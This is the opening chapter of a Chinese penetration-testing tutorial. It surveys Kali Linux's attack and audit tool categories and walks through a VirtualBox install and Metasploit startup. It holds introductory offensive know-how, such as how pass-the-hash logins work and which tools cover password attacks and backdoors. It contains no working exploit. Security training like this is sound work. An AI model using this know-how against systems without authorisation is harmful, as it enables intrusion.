# Kali Linux渗透测试实战 第一章

作者博客：[http://www.xuanhun521.com/](http://www.xuanhun521.com/)

1.1 Kali Linux简介
----------------

* * *

如果您之前使用过或者了解BackTrack系列Linux的话，那么我只需要简单的说，Kali是BackTrack的升级换代产品，从Kali开始，BackTrack将成为历史。

如果您没接触过BackTrack也没关系，我们从头开始了解Kali Linux。

按照官方网站的定义，Kali Linux是一个高级渗透测试和安全审计Linux发行版。作为使用者，我简单的把它理解为，一个特殊的Linux发行版，集成了精心挑选的渗透测试和安全审计的工具，供渗透测试和安全设计人员使用。也可称之为平台或者框架。

![17182302-122acb302af04b68a31ad036c8fe08d](http://drops.javaweb.org/uploads/images/ce266df913d05a77a3a18755175afc35e02c3427.jpg)

### Kali Linux

作为Linux发行版，Kali Linux是在BackTrack Linux的基础上，遵循Debian开发标准，进行了完全重建。并且设计成单用户登录，root权限，默认禁用网络服务。

关于系统特性，定制，在不同设备上的安装，请在Kali Linux官网上查阅，[http://www.kali.org/](http://www.kali.org/)。官网上还有一份中文版的说明文档，但是我总觉得要么是自动翻译的，要么是外国人自行翻译的，读起来非常不通顺，但是仍然可作为参考，见[http://cn.docs.kali.org/](http://cn.docs.kali.org/)。

![17182311-298d1ffa0c8a4c32ac4016dbc1b9b9c](http://drops.javaweb.org/uploads/images/76bae572754b01067f1b89927e32cbead44fb31a.jpg)

### 中文文档

因为本书的核心内容是渗透测试，Kali Linux只是平台，更多的关于系统本身的内容不会详细介绍。下面我们来看看Kali自带的工具集，介绍完这些工具，相信你也就了解了Kali Linux的功能。

![17182319-948f1b9e822041a8b9c77a63f508852](http://drops.javaweb.org/uploads/images/f20a3b8a90b76fee5d8a231ed76ed1d31d668a63.jpg)

上图是安装完Kali Linux（在下一节，会简单介绍虚拟机下Kali Linux的安装和配置）系统自带的工具集。最顶层是十佳安全工具，这些工具都被包含在下面的工具分类中。

Kali Linux将所带的工具集划分为十四个大类，这些大类中，很多工具是重复出现的，因为这些工具同时具有多种功能，比如nmap既能作为信息搜集工具也能作为漏洞探测工具。其中大部分工具的使用，都会在之后的章节中做介绍和实例演示。另外，这里介绍的工具都是系统默认推荐的工具，我们也可以自行添加新的工具源，丰富工具集。根据笔者的经验，绝大多数情况下，系统推荐的工具已经足够使用了。一些专用工具，会在特定的测试场景下被引入，在后续章节中会详细说明。

### 信息搜集

信息搜集工具集又分为DNS分析、IDS/IPS识别、SMB分析、SMTP分析、SNMP分析、SSL分析、VoIP分析、VPN分析、存活主机识别、电话分析、服务指纹识别、流浪分析、路由分析、情报分析、系统指纹识别共15个小分类。

![17182326-305eb706f27a44e5b5f20a258da853f](http://drops.javaweb.org/uploads/images/f5faec97d529340fcbf191b848ac1dc66b7c83c8.jpg)

### 信息搜集工具分类

DNS分析包含dnsdict6、dnsenum等12个工具，如下图。

![17182335-27a4fe3be1ab40f49141eee50d836a7](http://drops.javaweb.org/uploads/images/8776a24d55379301ecd605d29700093f76ceacdd.jpg)

### Dns分析工具

IDS/IPS识别包含fragrout、fragrouter、ftest、lbd、wafwOOf四个工具。

![17182343-09f9bb79480c4188a230273dce2e2bc](http://drops.javaweb.org/uploads/images/5ebb1db9875df7bbc9de3c53c466dab96cf33790.jpg)

### IDS/IPS识别工具

#### 扩展---|||||IDS/IPS

IDS(intrusion detection system),即入侵检测系统。是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS是一种积极主动的安全防护技术。

IPS（Intrusion Prevention System）即入侵防御系统。IPS位于防火墙和网络的设备之间。这样，如果检测到攻击，IPS会在这种攻击扩散到网络的其它地方之前阻止这个恶意的通信。

二者的区别：

入侵检测系统注重的是网络安全状况的监管。入侵防御系统关注的是对入侵行为的控制。

入侵检测系统需要部署在网络内部的中心点，需要能够观察到所有网络数据。入侵防御系统需要部署在网络的边界。

入侵检测系统的核心价值在于通过对全网信息的分析，了解信息系统的安全状况，进而指导信息系统安全建设目标以及安全策略的确立和调整，而入侵防御系统的核心价值在于安全策略的实施—对黑客行为的阻击;入侵检测系统需要部署在网络内部，监控范围可以覆盖整个子网，包括来自外部的数据以及内部终端之间传输的数据，入侵防御系统则必须部署在网络边界，抵御来自外部的入侵，对内部攻击行为无能为力。

参考：[http://security.zdnet.com.cn/security_zone/2009/0412/1362627.shtml](http://security.zdnet.com.cn/security_zone/2009/0412/1362627.shtml)

### smb分析包含如下工具：

![17182358-0c158eede8be448aae715ae0228184c](http://drops.javaweb.org/uploads/images/caf9a3df32448b835d4115c38f0c49ec17351271.jpg)

#### 扩展---|||||smb协议

MB简介SMB是Server Message Block的简写，这个协议用于共享文件，共享打印机，共享串口等用途。我们之所以能够在windows的网络邻居下访问一个域内的其他机器，就是通过这个协议实现的。SMB 协议是一个很重要的协议，目前绝大多数的PC上都在运行这一协议，windows系统都充当着SMB协议的客户端和服务器，所以SMB是一个遵循客户机服/务器模式的协议。SMB服务器负责通过网络提供可用的共享资源给SMB客户机，服务器和客户机之间通过TCP/IP协议、或者IPX协议、或者是 NetBEUI进行连接。

参考：http://msdn.microsoft.com/en-us/library/cc246231.aspx

#### smtp分析包含如下工具:

![17182405-fb2d7ce5f2ed4dd6bea7852c05dcf50](http://drops.javaweb.org/uploads/images/37a0610f7851310fac6fcd2f506f1d3e55a5766b.jpg)

#### smtp分析工具

snmp分析报告如下工具：

![17182411-66bdd56b75bc4aa288a58a95dd7bea2](http://drops.javaweb.org/uploads/images/b4ca1ba2b7e635413a44fbf68a75c4472d024be9.jpg)

### SSL分析包含如下工具：

![17182418-447542044268453fb123a5efc0f65c4](http://drops.javaweb.org/uploads/images/b0671e1f6110eadc5523f5a86397019057bd7494.jpg)

### VoIP分析包含如下工具：

![17182425-13e624b9a5384b43a90e016c0bf5744](http://drops.javaweb.org/uploads/images/e7d700948f100f8374dfa42555f58bbae7fa5b69.jpg)

#### 扩展—VoIP简介

VoIP是 Voice over Internet Protocol的缩写，指的是将模拟的声音讯号经过压缩与封包之后，以数据封包的形式在IP 网络的环境进行语音讯号的传输，通俗来说也就是互联网电话、网络电话或者简称IP电话的意思。

参考资料：[https://www.cisco.com/application/pdf/en/us/guest/tech/tk587/c1506/ccmigration_09186a008012dd36.pdf](https://www.cisco.com/application/pdf/en/us/guest/tech/tk587/c1506/ccmigration_09186a008012dd36.pdf)

### VPN分析只包含一个工具：ike-scan

![17182432-8dde89272a724cc796deedca9c8f368](http://drops.javaweb.org/uploads/images/8c443f9859e2f585425c8b0f48c622e1b26b8131.jpg)

### 存活主机识别包含的工具：

![17182442-81ee437b09794d1f98f4c1700001cf8](http://drops.javaweb.org/uploads/images/d427c2100b87d490d806b9209cb8560443cc30a4.jpg)

### 服务器指纹识别包含如下工具：

![17182451-8b10c8027fca4e69b9559415e083119](http://drops.javaweb.org/uploads/images/f4d597df4cc68a800bce1ee97bcdd36ec614d469.jpg)

### 流量分析包含如下工具：

![17182500-917117facd364ab2b3070bc0bd8aede](http://drops.javaweb.org/uploads/images/c40f3d907d62dbff80448ebd05d701c8033ac2a4.jpg)

### 路由分析包含如下工具：

![17182520-a0024e770f304a98916c093b7b9d339](http://drops.javaweb.org/uploads/images/7fd48f29acbfeaa22a86f6fce0989d5e65807f84.jpg)

### 情报分析包含如下工具：

![17182528-389fa3e7a6744dccb8bbe9f92c09464](http://drops.javaweb.org/uploads/images/9ecf0894c0a1624dc26962965205d2d0d6f6b7eb.jpg)

### 网络包含如下工具：

![17182543-f4e53eb4819c454299d52456a7dea47](http://drops.javaweb.org/uploads/images/54331330f0494ffbbbc46679ec61bdf22da8b03a.jpg)

### 系统指纹识别包含如下工具：

![17182553-38c006720ac949c19b7bf486c045432](http://drops.javaweb.org/uploads/images/87f50af4038a45400e979978e6e546404d402f04.jpg)

#### 扩展—指纹识别：

在实际的生产环境中，应用程序返回的软件、服务器、操作系统的相关信息，很有可能是伪装过的。比如请求一台apathe服务器，如果它在http响应中返回的是IIS 6.0的信息，如果我们简单的认为它是iis服务器，并以此为依据继续接下来的渗透工作，岂不是南辕北辙？指纹识别技术应运而生，向测试对方发送特殊的请求，根据响应内容的不同来做出正确的识别，这种技术称之为指纹识别技术。常用的操作系统指纹识别技术为IP协议栈。

链接[http://nmap.org/book/osdetect-fingerprint-format.html](http://nmap.org/book/osdetect-fingerprint-format.html)是Nmap操作系统指纹识别的基本原理

### 漏洞分析

![17182604-0313b47d774440379d5ef0b18d64202](http://drops.javaweb.org/uploads/images/b46ad47137c733a1b02d37ee3e7dad467d28ea7b.jpg)

漏洞分析工具集

漏洞分析工具集，共分为6个小类，分别为Cisco工具集、Fuzzing工具集、OpenVAS、开源评估软件、扫描工具集、数据库评估软件。

### Cisco工具集包含如下工具：

![17182613-9bd70165995b40fab3472588fcf3d7e](http://drops.javaweb.org/uploads/images/8329cc0e0e91f203d10b64bdb19bb50112940c6f.jpg)

### Fuzzing工具集下包含如下工具：

![17182621-8564ddccd0e8418cb3c42a377a37fd9](http://drops.javaweb.org/uploads/images/5af4ee0745e413cf0e4a5f5a3263e2b8ab9ddb87.jpg)

#### 扩展—Fuzzing

模糊测试 （fuzz testing, fuzzing）是一种软件测试技术。其核心思想是自动或半自动的生成随机数据输入到一个程序中，并监视程序异常，如崩溃，断言(assertion)失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。

模糊测试工具主要分为两类，变异测试（mutation-based）以及生成测试（generation-based）。模糊测试可以被用作白盒，灰盒或黑盒测试。[3](http://security.zdnet.com.cn/security_zone/2009/0412/1362627.shtml)文件格式与网络协议是最常见的测试目标，但任何程序输入都可以作为测试对象。常见的输入有环境变量，鼠标和键盘事件以及API调用序列。甚至一些通常不被考虑成输入的对象也可以被测试，比如数据库中的数据或共享内存。

参考：[https://www.owasp.org/index.php/Fuzzing](https://www.owasp.org/index.php/Fuzzing)

#### OpenVAS 包含如下工具：

![17182630-50fb6d30e73c4f328011142a1c59cc0](http://drops.javaweb.org/uploads/images/d6d60c6c8bd25f8e9681effd96b9b68838390b45.jpg)

#### 扩展—OpenVAS

OpenVAS是一款开放式的漏洞评估工具，主要用来检测目标网络或主机的安全性。与安全焦点的X-Scan工具类似，OpenVAS系统也采用了Nessus较早版本的一些开放插件。OpenVAS能够基于C/S(客户端/服务器),B/S(浏览器/服务器)架构进行工作，管理员通过浏览器或者专用客户端程序来下达扫描任务，服务器端负载授权，执行扫描操作并提供扫描结果。

参考：[http://www.openvas.org/](http://www.openvas.org/)

### 开源评估软件包含如下工具：

![17182642-686f7ec5b3ef4b0790d41c754a3d935](http://drops.javaweb.org/uploads/images/81d7ae250fbac0c7c46d9a6e7d3120049ce7a127.jpg)

### 扫描工具集包含如下工具：

![17182650-fe9dfb882e2b4834b36b47abe35ce96](http://drops.javaweb.org/uploads/images/1afcd26ada85187fd02fe61c198505bb8fc8ea0d.jpg)

### 数据库评估软件包含如下工具：

![17182658-c5db5ae7b45e4389bc55a41fdaeacc0](http://drops.javaweb.org/uploads/images/fbabe28685b6c25b6480cf824bd4465718f930e1.jpg)

### Web程序

Web程序下主要包含CMS识别、IDS/IPS识别、Web漏洞扫描、Web爬行、Web应用代理、Web应用漏洞挖掘、Web库漏洞利用共7个类别。

![17182714-2cff450a490e405c9dda5b855ca310e](http://drops.javaweb.org/uploads/images/90f26787a66b9f6a00c3709828809c7d36ba85cd.jpg)

### 密码攻击

密码攻击主要包括GPU工具集、Passing the Hash、离线攻击、在线攻击。

![17182724-046c23f3069d4bcfa9ff063bd6c9415](http://drops.javaweb.org/uploads/images/c05c0a4ea0ad17be7ddb4d369fda8228f8c28ad0.jpg)

#### 扩展—Passing the Hash

Passing the Hash，中文一般翻译为Hash传递攻击。在windows系统中，系统通常不会存储用户登录密码，而是存储密码的Hash值。在我们远程登录系统的时候，实际上向远程传输的就是密码的Hash。当攻击者获取了存储在计算机上的用户名和密码的hash值 的时候，他虽然不知道密码值，但是仍然可以通过直接连接远程主机，通过传送密码的hash值来达到登录的目的。

### 无线攻击

无线攻击包含RFID/NFC工具集、Software Defined Radio、蓝牙工具集、其他无线工具、无线工具集。

![17182735-34b07d4d51ac42d49308ce711f35a53](http://drops.javaweb.org/uploads/images/e7d644974d65224b8fc9f48115646c5fd2856e3f.jpg)

#### 扩展-- Software Defined Radio

软件无线电（Software Defined Radio，SDR）是一种实现无线通信的新概念和体制。一开始应用在军事领域，在21世纪初，由于众多公司的努力，使得它已从军事领域转向民用领域，成为经济的、应用广泛的、全球通信的第三代移动通信系统的战略基础。

由于无线通信领域存在的一些问题，如多种通信体系并存，各种标准竞争激烈，频率资源紧张等，特别是无线个人通信系统的发展，使得新的系统层出不穷，产品生产周期越来越短，原有的以硬件为主的无线通信体制难以适应这种局面，迫使软件无线电的概念的出现。它的出现，使无线通信的发展经历了由固定到移动，由模拟到数字，由硬件到软件的三次变革。

参考：[http://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E6%97%A0%E7%BA%BF%E7%94%B5](http://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E6%97%A0%E7%BA%BF%E7%94%B5)

### 漏洞利用工具集

漏洞利用工具集，主要包含了几个流行的框架，和其他工具。

![17182749-50b8c823d7d441e49b1e3475b289d9c](http://drops.javaweb.org/uploads/images/3f2b8c9d9e819ea44d0313a540b04ef374d24a40.jpg)

BeEF XSS Framework，官方站点[http://beefproject.com/](http://beefproject.com/)。全称Browser Exploitation Framework，它是专注于 web浏览器的渗透测试框架。

Metasploit，官方站点[http://www.metasploit.com/](http://www.metasploit.com/)。著名的渗透测试框架，是渗透测试人员的必修课。

### 嗅探/欺骗

嗅探、欺骗  包含VoIP、Web嗅探、网络欺骗、网络嗅探、语言监控五个工具集。

![17182807-31d63185638c4f738bf06303942dc49](http://drops.javaweb.org/uploads/images/69847571ad1af71feaaa40abb7f6a1ab00c49b6a.jpg)

### 权限维持

权限维持包含Tunnel工具集、Web后门、系统后门三个子类。

![17182816-77a9bc8280b04d11bba77390e18b96b](http://drops.javaweb.org/uploads/images/6a6940c2e2f2ca5ae093f4bc992e0dfbbcfaa0e5.jpg)

其中Tunnel工具集包含了一系列用于建立通信隧道、代理的工具。

### 逆向工程

逆向工程，包含了Debug工具集、反编译、其他逆向工具集三个子类。

![17182825-7d09118d3ed24d669ec1d512dc9e4a4](http://drops.javaweb.org/uploads/images/b7ce4d1dd6f38e6ce895e6023bf252f86eb535ef.jpg)

### 压力测试

压力测试包含VoIP压力测试、Web压力测试、网络压力测试、无线压力测试四个子类。

![17182835-055c578541614592af2d30190b85414](http://drops.javaweb.org/uploads/images/137d23a096896031ccd98312b8f688f29ae85422.jpg)

### 硬件Hacking

硬件Hacking包括Android工具集、Arduino工具集两个子类。

![17182846-bb24fd176c6a466497969f102a603ec](http://drops.javaweb.org/uploads/images/474c525d3dc929b6c212256fe1919c5e99c15719.jpg)

### 数字取证

数字取证工具集包含PDF取证工具集、反数字取证、密码取证工具集、内存取证工具集、取证分割工具集、取证分析工具集、取证哈希验证工具集、取证镜像工具集、杀毒取证工具集、数字取证、数字取证套件。

![17182853-b80f0e19069442d8bc0100ce974f981](http://drops.javaweb.org/uploads/images/bd88a01b667c4982076ee3a207c88cfd25ccb8f3.jpg)

### 报告工具集

报告工具集，主要用于生成、读取、整理渗透测试报告的工具，包含Domentation、媒体捕捉、证据管理。

![17182902-fe21081d76bf4e0b80813465fa9040f](http://drops.javaweb.org/uploads/images/e08dc063931307168580f5118d934a5993334daa.jpg)

### 系统服务

系统服务是系统上的服务程序，包括BeFF、Dradis、HTTP、Metasploit、MySQL、OpenVas、SSH。

默认情况下，网络和数据库服务是关闭的，需要重新开启。

![17182911-5f0ba299e3d0418a9138e6c019a65f9](http://drops.javaweb.org/uploads/images/4b0c0b4374d8fba48fe8c8902f2c11526c01e8a4.jpg)

### 小结

上面对Kali Linux的默认工具集进行的了大致的浏览，由于本书只关注于渗透测试，对逆向工程、压力测试、硬件Hacking、数字取证这些工具不会涉及。

下一节介绍虚拟机下的系统安装和简单配置。

1.2 环境安装及初始化
------------

* * *

在1.1节，我们大致了解了Kali Linux的内置工具集，本节主要介绍虚拟机下的系统安装。

如果您需要定制或者采用其他方式安装系统，请参考官方文档，[http://cn.docs.kali.org/](http://cn.docs.kali.org/)。官方文档内容大致如下图：

![17184820-80a74906de1f4673b88c538b822c39d](http://drops.javaweb.org/uploads/images/78a4f6aee527077230b53ae160b60cd2a8104aea.jpg)

KaliLinux官方文档（1）

![17184826-1cc637e8547b48c9bc4706f34293f43](http://drops.javaweb.org/uploads/images/ecc3f41c4855ccaa933829699c604ce36e17d414.jpg)

Kali Linux 官方文档（2）

### 1.2.1 下载映像

在地址http://www.kali.org/downloads/，我们可以看到网站提供32位和64位的ISO映像文件。

![17184835-0697c96e86e8438099cfd8b9e17d70f](http://drops.javaweb.org/uploads/images/10b515e1c5230a01d1379185cc1a10336a4c92fd.jpg)

下载映像文件

根据实际情况选择你要下载的版本，我下载的是Kali Linux 64 Bit。

### 1.2.2 安装虚拟机

相对于VMWare，个人更喜欢VirtualBox，因为VirtualBox是开源、免费，比VMWare更轻量。

首先到[https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)下载VirtualBox。我选择的是VirtualBox 4.3.4 for Windows hosts。

![17184841-8a51452fd0924622b3ae4b5b71587d0](http://drops.javaweb.org/uploads/images/0c6f5ba77f280456fe639461def86c2667ecde04.jpg)

安装就很简单了，这里就不浪费篇幅了。

安装完成之后，打开VirtualBox，开始安装Kali Linux。

### 1.2.3 安装Kali Linux

打开VirtualBox之后，单击“新建”，打开新建虚拟机对话框。

![17184848-8dbd92cb6fbe4d70847fbae8b46d5aa](http://drops.javaweb.org/uploads/images/bc9231937638cac15de8f0abb0d32a8c786359e8.jpg)

新建虚拟机

名称随意填写，类型选择Linux，版本选择Debian或者Debian(64 bit)，我安装64位版本，所以选择Debian(64 bit)。单击“下一步”。

![17184855-7fce46a2408a4bc1bcd7f3ecb63dfc5](http://drops.javaweb.org/uploads/images/3988778034991a9d59321709563a47f0aeec9dac.jpg)

配置内存大小

内存大小，根据自己机器的内存选择配置就可以了，这里采用默认值。

下一步，配置虚拟硬盘。

![17184902-731ee2674bf94ad0b45a88aef54d93d](http://drops.javaweb.org/uploads/images/071b590cbe42a44d3d64a8b9226cf3668b19017b.jpg)

配置虚拟硬盘

选择新建虚拟硬盘，单击“创建”。

![17184908-646666a770ef4fa8a74ce2a51e81ff6](http://drops.javaweb.org/uploads/images/bd15f7a9b31904682243c7d74e12df2e7d76d467.jpg)

选择虚拟硬盘文件类型

虚拟硬盘文件类型，选择VDI类型。下一步。

![17184914-1e30258c9bcd4ecea7dbf7e8a5587e9](http://drops.javaweb.org/uploads/images/48b5a8de64e50bf170b00c7ef0e77d2957f69b97.jpg)

虚拟硬盘物理存储

这里笔者选择固定大小。下一步，选择文件存储位置，设置磁盘大小。

![17184924-992f4d35232247d7a4778e19e3ae1e8](http://drops.javaweb.org/uploads/images/5b853d84c0c0d4b43b0f96260cb9c8181023a438.jpg)

选择文件存储位置

虚拟磁盘的大小，建议要大于8G，笔者使用默认的8G安装，结果中途失败，修改为20G后，安装成功。开始创建。

![17184933-2f10971bad834104a126aa05f656bd3](http://drops.javaweb.org/uploads/images/ecbe3f8ddb2dabeb53fe9f06c69d292e2c94658e.jpg)

经历一段时间等待（VirtualBox的虚拟磁盘创建速度确实不如VMWare），虚拟磁盘创建完毕。回到VirtualBox主界面，选择我们创建的虚拟机。单击上方的“设置”按钮。

![17184940-486f10428b004886bd000bce80b6c1b](http://drops.javaweb.org/uploads/images/e787f2a9ffc9968820df45f5ee5dfb6fa54334b6.jpg)

![17184948-0e9d39fdf0a9404bace3acef1d4388d](http://drops.javaweb.org/uploads/images/6282b7c0edcfb2fff50b58106fc1b36a5a8b185b.jpg)

选择“存储”选项卡。

![17185004-804cf092a7a4437f869cbd528d1ab7f](http://drops.javaweb.org/uploads/images/42420e3ba65c261f9471ebdc3f915393bea73241.jpg)

接下来选中光驱。

配置光驱，加载安装映像文件。在分配光驱属性选择“第一IDE控制器主通道”，加载下载的Kali Linux ISO文件。

选择“网络”选项卡，配置为桥接模式。确定。

![17185013-b713a74a8ebe4b5da2672241b94015e](http://drops.javaweb.org/uploads/images/6fe95d71f865c36976d052fe384c715f5e15bf25.jpg)

配置网络为桥接模式

回到主界面，启动虚拟机，加载ISO。

![17185023-adefbd710cbc458b9f970e2c8feea19](http://drops.javaweb.org/uploads/images/3368a72dba612ea16ed2838c14a654cce41fd7b3.jpg)

选择“Graphic install”，继续。

![17185034-c79bc6956d854c679333c83bec90439](http://drops.javaweb.org/uploads/images/a17b0446c2918ae82ec2d281ec1ab686aa67e938.jpg)

选择语言为中文简体。

![17185044-cbe22f50cc31450ebce8f3091c0fc0a](http://drops.javaweb.org/uploads/images/f060d1f46f8d21bb3dc3ed38da4c154e28ac3182.jpg)

选择区域为中国。

![17185055-45f8c1624feb40c79510124b3303c07](http://drops.javaweb.org/uploads/images/c131fa511ff74a29f3c23f5c50b6c9f482157ecd.jpg)

配置键盘为“汉语”。

![17185103-b55e519654494a86ac0489f89537f16](http://drops.javaweb.org/uploads/images/defffffb906ac3ebd2a073d329fac15f94b75783.jpg)

开始从光盘加载组件。

![17185111-25a95e695726434d8d3c6506f8edf61](http://drops.javaweb.org/uploads/images/3c805b9c34f232d4c0269c6e6247e38a7e8d543c.jpg)

探测并配置网络。

![17185120-980f888179de4179b972dc1764f0eac](http://drops.javaweb.org/uploads/images/663264f39627529f9a8e18ec1074e7f2c8e811a7.jpg)

配置主机名，根据自己的喜好配置就可以了。

![17185129-0e846c785bc845bc86f2f449fa23e8b](http://drops.javaweb.org/uploads/images/5afb4f173e796327d5c2013c57288f6bec344a8a.jpg)

配置域名，如果不在外网，域名随便配置就可以了。

![17185138-327f6fd0dc5b478d9cc075cb63b535b](http://drops.javaweb.org/uploads/images/99065719333ca7e3c72d58fe62c5f826617b8675.jpg)

设置Root账户密码。

![17185153-61a55cade88e40b692664ee279313d8](http://drops.javaweb.org/uploads/images/e5e96600df559c02ce0bcf00807337ccecf62216.jpg)

配置磁盘分区，这里和接下来的步骤，为简单起见，我们都选择非手工方式，选择“使用整个磁盘”。

![17185201-ec9c732a1388462e8b2e9a7ac5f8649](http://drops.javaweb.org/uploads/images/750c7a0ee756c072a9a6fb9797c2390a0a758124.jpg)

只有一个磁盘，继续。

![17185210-c553f19c74184e6a8b279a1cbe3724b](http://drops.javaweb.org/uploads/images/a2bf8f49d3df625c20cc2e1ce1495469356f575c.jpg)

选择分区方案。

![17185219-d5f242aec1b646c38eff8437d0a86e6](http://drops.javaweb.org/uploads/images/b1b1066153be8f6d11f4d745db7dbf4f096b8fad.jpg)

![17185226-be5eaae68f5c4abeadea4e08a848071](http://drops.javaweb.org/uploads/images/4752cbb7232632c970132b249998c793a1a75181.jpg)

确认分区方案。

![17185234-1ba6398ba879419484dee9947a8c4b5](http://drops.javaweb.org/uploads/images/84430808b726197a7c5011b77730aa49aaa53740.jpg)

开始安装系统。

![17185246-d2ee4ca9b1404595998d68c6e54e6dc](http://drops.javaweb.org/uploads/images/29368fd4618a0efe2aaee44f6b64425e980dab02.jpg)

映像内容安装完成后，会提醒是否使用网络映像，如果处于联网状态，推荐使用，以便获取更新的内容。

![17185255-0b3db3fba7e445b2b0842bd72f698da](http://drops.javaweb.org/uploads/images/a2d71a6a7cb8d5554931882a27c3d60b50056f57.jpg)

安装完成后，点击继续，结束安装过程。虚拟机会重启进入Kali Linux。

### 1.2.4 安装中文输入法

在系统登录界面，选择你设置的域，输入用户名“root”，你先前配置好的密码，登录。

![17185307-ca3f2e18d8764bfe8c6f6c43a5baf9b](http://drops.javaweb.org/uploads/images/a3218479ff7ad5d7a9b5ec6964a4d88f20cc610a.jpg)

系统默认是没有中文输入的，为使用方便，先安装中文输入法。

先执行`apt-get update`命令

![17185316-a516eb09b60c42d4893623977940cf9](http://drops.javaweb.org/uploads/images/f185c8563af03e813b691e0cf781e40f924fc213.jpg)

接下来执行

```
apt-get install fcitx

```

![17185323-5b6a3ba4ae2541d9aa5b870cf125857](http://drops.javaweb.org/uploads/images/9918f7b6bc7b50f85d88d2e8ccf937ebfac432ed.jpg)

安装成功后，执行

```
apt-get install fcitx-googlepinyin

```

安装谷歌拼音输入法。

![17185332-e311deecd0604b82ac9c2b200bc390b](http://drops.javaweb.org/uploads/images/112bcf7afe86bb42ec1424da572be53a52388bf7.jpg)

重启系统。

![17185340-8d11ea073cca47df9086e449a6c87c4](http://drops.javaweb.org/uploads/images/f7ef0cbf28040357b15c406497baf2c5f3fef3b0.jpg)

在屏幕顶部可以看到输入法配置图标，新建一个文档，用Ctrl+Shift，可以调出输入法。

### 1.2.5 安装VirtualBox增强工具

安装VirtualBox增强工具之后，虚拟机和宿主机之间就可以共享目录、共享剪贴板了。

首先启动Kali Linux虚拟机后,打开一个终端然执行如下命令来安装Linux内核头文件。

```
apt-get update && apt-get install -y linux-headers-$(uname -r)

```

![17185354-266008c8bf42435c89aaebddce9d37b](http://drops.javaweb.org/uploads/images/b6aa17550705d5596dbb2b9dfe9f5be955cfc33f.jpg)

在虚拟机内部，按“键盘右侧的Ctrl+D”，会自动加载增强工具光盘映像，提示是否要自动运行，点击取消。

![17185405-680e1626df414a0c8178943181b0b19](http://drops.javaweb.org/uploads/images/eeb80a069ae1eab7ac4f8cb88d25d4eddddc6e97.jpg)

双击桌面上的光盘图标，打开后复制VboxLinuxAdditions.run到本地目录，例如/root/。或者在终端执行以下命令：

cp /media/cd-rom/VBoxLinuxAdditions.run /root/

![17185416-ab03285ae1eb429792e04e1363fd713](http://drops.javaweb.org/uploads/images/8accb78a953794ee5f12940b733f1ce0f882de63.jpg)

接下来从终端进入文件所在目录，先修改文件权限，保证可以被执行。

```
chmod 755  VBoxLinuxAdditions.run

```

执行：

```
./VBoxLinuxAdditions.run

```

![17185427-31ce1f1842cd4ce9baeef820f63dea6](http://drops.javaweb.org/uploads/images/08172ee99e28b1aa150f010e7acd0d19433fcfb1.jpg)

关闭虚拟机。

1.2.6 配置共享目录和剪贴板

在virtualBox中选中虚拟机，点击“设置”，选择“共享文件夹”。

![17185436-6a7fcba56cd140959519d90011df029](http://drops.javaweb.org/uploads/images/27bc95613df4b12b2689dca922a206342cd53396.jpg)

添加一个本地目录。

![17185444-3b752eddb007447a8809d408f92ff2a](http://drops.javaweb.org/uploads/images/06696bbd60e2c429748e07ddc3dc33e71dd0c5b2.jpg)

然后切换到“常规”，选择“高级”选项卡，配置剪贴板共享。

![17185454-53cec11394b44a5ba1df39eeb2a9364](http://drops.javaweb.org/uploads/images/ef3a79a1c15634427c987781dcb921f035c30626.jpg)

启动虚拟机。正常情况下，系统启动会自动挂载共享文件夹，在/media/目录下。

![17185502-bcc1f49fde064087b78a1def6f9ff20](http://drops.javaweb.org/uploads/images/3007b301191f7e3edc13eb3474969eec44afb768.jpg)

### 1.2.7 运行 Metasploit Framework

按照官方文档的说法，“依照Kali Linux网络服务策略,Kali没有自动启动的网络服务,包括数据库服务在内。所以为了让Metasploit以支持数据库的方式运行有些必要的步骤”。下面我们按照官方文档的说明，按部就班的操作一下。

启动Kali的PostgreSQL服务

执行命令：

```
service postgresql start

```

![17185514-c178fecba90d4ba5be04b9242fb0249](http://drops.javaweb.org/uploads/images/b28f4b0ccb86c9ff685f158379bc56fb83fe80cf.jpg)

使用

```
ss –ant

```

检查PostgreSQL的运行状态。

![17185526-a6ad3594529e41859f2b558d1ab2a8c](http://drops.javaweb.org/uploads/images/392e8424b9921303b2f3207d58090b0d6df7466d.jpg)

如图，5432端口处于监听状态。

启动Kali的Metasploit服务

执行命令启动Metasploit服务：

```
service metasploit start

```

![17185535-12dba843ce8d43c2b78750e61a74b88](http://drops.javaweb.org/uploads/images/568496b6fad139a3c5c12d0598ba11bcaa4e271a.jpg)

在Kali运行msfconsole

在终端执行`msfconsole`，启动Metasploit客户端。

![17185721-f8d806d23cb849fdad3f1df9e1117a6](http://drops.javaweb.org/uploads/images/7362b0a5f41cde0945e69b83716528a83eda4e3c.jpg)

然后在msf终端内，输入db_status，查看数据库状态。

![17185737-770b98f6df5d4bb8bb3d41fa3f69dcd](http://drops.javaweb.org/uploads/images/d9c74f3423c2af0e4d6d7a7ab2db508487d8cebd.jpg)

小结
--

* * *

本节的内容主要是安装和基础配置，未涉及具体的工具级别的内容。目前环境准备完毕，是不是万事具备只欠东风了呢？

在讲解具体操作之前，我还是想先讲一讲有关渗透测试的方法论有关内容。由于本书的核心是实际操作，所以方法论的内容相对于相关书籍会极其简单，只是一个简单流程化的梳理。

1.3 渗透测试的一般化流程
--------------

* * *

凡事预则立，不预则废，做任何事情都要有一个预先的计划。渗透测试作为测试学科的一个分支，早已形成了完整的方法论。在正式开始本书的实践教学章节之前，我也想谈一谈使用Kali Linux的基本方法。这里讨论方法论的目的有两个：

第一，在第一节里，我们看到Kali Linux集成了这么多工具，而且更令人欣喜的是已经对这些工具进行了专业的分类。这些工具的使用场景和使用阶段是什么样的呢？把工具拿来胡乱一顿扫描是不会有什么结果的。

第二，本书的章节规划，也需要一个规范，这个规范是我从渗透测试方法论中学来的，并进行了简化，称之为“渗透测试的一般化流程”。

当然本节内容不会长篇大论，也不适用于企业内部的专业的渗透测试团队来遵循。只是希望给初学渗透测试的同学一个入门的指引，有章可循，有法可依。只是学习本书的基本练习流程，不是标准的测试流程。

下面这这张图是《backtrack4 利用渗透测试保证系统安全》一书的Backtrack方法论。

![17190331-34037156945745bda7c1466544de6e0](http://drops.javaweb.org/uploads/images/5d8d626291ec223aa7208213ce4aa43596c09cce.jpg)

